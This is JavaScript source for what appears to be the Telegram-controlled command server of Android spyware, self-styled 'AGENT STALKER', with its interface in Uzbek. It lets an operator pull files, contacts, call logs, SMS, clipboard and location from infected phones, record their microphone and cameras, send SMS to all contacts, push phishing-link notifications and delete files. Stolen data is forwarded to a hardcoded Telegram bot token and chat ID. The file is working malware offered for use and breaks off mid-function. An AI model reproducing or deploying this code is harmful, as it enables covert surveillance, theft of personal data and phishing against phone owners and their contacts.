const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '7899917477:AAFNE5PJqkn5NcuZmffEiSTUnFdNWjG3lcU'
const id = '5210639990'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">server muvafaqqiyatli yuklandi</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• xabar ushbu qurilma  <b>${req.headers.model} tomonidan</b> `,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• xabar ushbu  tomonidan<b>${req.headers.model}</b> qurilma\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• lokatsiya <b>${req.headers.model}</b> qurilma nomi`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `°• yangi qurilma ulandi\n\n` +
        `• qurilma nomi : <b>${model}</b>\n` +
        `• batareyka holati : <b>${battery}</b>\n` +
        `• android versiyasi: <b>${version}</b>\n` +
        `• ekran chastotasi : <b>${brightness}</b>\n` +
        `• sim karta : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• qurilma chiqib ketdi\n\n` +
            `• qurilma nomi : <b>${model}</b>\n` +
            `• batareyka holati : <b>${battery}</b>\n` +
            `• android versiyasi : <b>${version}</b>\n` +
            `• ekran chastotasi : <b>${brightness}</b>\n` +
            `• sim karta: <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• sms yubormoqchi bolgan telefon raqamni kiriting ')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• yaxshi endi sms xabarni kiriting\n\n' +
                '• ehtiyot boling agar nomer xato kiritilsa komanda bajarilmaydi',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• sms yubormoqchi bolgan telefon raqamni kiriting ')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• sorov amalga oshirilmoqda \n\n' +
                '• sorov bir necha soniyalarda amalga oshiriladi',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ulangan qurilmalar"], ["komandalar royxati"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• hamma kontaktlarga xabar yuborish uchun xabar yozing')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°•sizning sorovingiz qabul qilindi\n\n' +
                '• ʏsorov amalga oshirilmoqda bu bir necha soniyalar olishi mumkin',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ulangan qurilmalar"], ["komandalar royxati"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• faylni yuklash uchun  joylashgan joyni kiriting')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• sorov qabul qilindi\n\n' +
                '• bir necha soniyalar ichida amalga oshiriladi',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ulangan qurilmalar"], ["komandalar royxati "]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• faylni ochirish uchun u joylashgan joyni kiriting')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• sorov amalga oshirilmoqda\n\n' +
                '• ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ulangan qurilmalar"], ["komandalar royxati"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• mikrofonni necha soniya yozib olishni kirting')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• sizning sorovingiz qabul qilindi\n\n' +
                '• bu bir necha soniyalar ichida amalga oshiriladi',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ulangan qurilmalar"], ["komandalar royxati "]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• kameraga necha soniya davom etishini kiriting ')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• sizning sorovingiz qabul qilindi\n\n' +
                '• bu bir necha soniya ichida amalga oshiriladi',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ulangan qurilmalar"], ["komandalar royxati"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• selfie kamera qancha muddat yozib olinishini kiriting')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• sizning sorovingiz qabul qilindi\n\n' +
                '• bu bir necha soniyalar ichida amalga oshirilmoda',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ulangan qurilmalar"], ["komandalar royxati"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ulangan qurilmaga xabarni yozing')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• sizning sorovingiz qabul qilindi\n\n' +
                '• bu bir cha soniya olishi mumkin',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ulangan qurilmalar"], ["komandalar royxati"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• bildirishnomaga')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '°• endi bildirishnoma qanaqa borishini kiriting\n\n' +
                '• ',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• fishing ssilka kiriting')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• sizning sorovingiz qabul qilindi\n\n' +
                '• bu bir necha soniya olishi mumkin',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ulangan qurilmalar"], ["komandalar royxati"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°•musiqa linkini yuboring')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• sizning sorovingiz qabul qilindi\n\n' +
                '• bu bir necha soniya ichida amalga oshiriladi',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ulangan qurilmalar"], ["komandalar royxati"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• xush kelibsiz AGENT STALKER\n\n' +
                '• qurilmaga dastur ornatilgan bolsa uni ulanishini kuting \n\n' +
                '• botdan ulanish haqida xabar kelsa bu muvafaqqiyaqli ulandi degani\n\n' +
                '•qurilmalar royxatini tanlang va kerakli buyruqni tanlang \n\n' +
                '• agar bot ishlamay qolsa qaytib /start buyrugini yuboring\n\n @virtual_stalker ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ulangan qurilmalar"], ["komandalar royxati"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == 'ulangan qurilmalar') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°•ulangan qurilma yoq\n\n' +
                    '• ilovaga ulanganiga ishonch hosil qiling'
                )
            } else {
                let text = '°• ulangan qurilmalar royxati :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• qurilma nomi : <b>${value.model}</b>\n` +
                        `• batareyka holati : <b>${value.battery}</b>\n` +
                        `• android versiyasi : <b>${value.version}</b>\n` +
                        `• ekran chastotasi : <b>${value.brightness}</b>\n` +
                        `• sim karta : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == 'komandalar royxati') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°•ulangan qurilmalar yoq\n\n' +
                    '• qurilma ornatilganiga ishonch hosil qiling'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• qurilmani boshqarish uchun uni tanlang', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '°• ruxsat berilmagan')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• qurilma uchun komanda tanlang : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: 'ilovalar', callback_data: `apps:${uuid}`},
                        {text: 'qurilma malumoti', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: 'faylni skachat qilish', callback_data: `file:${uuid}`},
                        {text: 'faylni ochirib yuborish', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: 'kopirovat qilingan soz', callback_data: `clipboard:${uuid}`},
                        {text: 'mikrofon', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: 'orqa kamera', callback_data: `camera_main:${uuid}`},
                        {text: 'old kamera', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'lokatsiya', callback_data: `location:${uuid}`},
                        {text: 'qisqa xabar', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: 'qongiroqlar royxati', callback_data: `calls:${uuid}`},
                        {text: 'kontaktlar royxati', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: 'viratsiya qilish', callback_data: `vibrate:${uuid}`},
                        {text: 'bildirishnoma yuborish', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: 'xabarlar', callback_data: `messages:${uuid}`},
                        {text: 'sms yuborish', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: 'audio qoyish', callback_data: `play_audio:${uuid}`},
                        {text: 'audio toxtatish', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: 'barcha kontaktlarga sms yuborish',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• sizning sorovingiz qabul qilindi\n\n' +
            '•bu bir necha soniya ichida amalga oshiriladi',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ulangan qurilmalar"], ["komandalar royxati"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• sizning sorovingiz qabul qilindi\n\n' +
            '• bu bir necha soniya ichida amalga oshiriladi',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ulangan qurilmalar"], ["komandalar royxati"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• sorovingiz qabul qilindi\n\n' +
            '•bu bir necha soniya davom etishi mumkin',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ulangan qurilmalar"],      ["komandalar royxati"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• sizning sorovingiz qabul qilindi\n\n' +
            '• bu bir necha soniya olishi mumkin',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ulangan qurilmalar"], ["komandalar royxati"]],
                    'resize_keyboard': true
                }
            }
        )
    
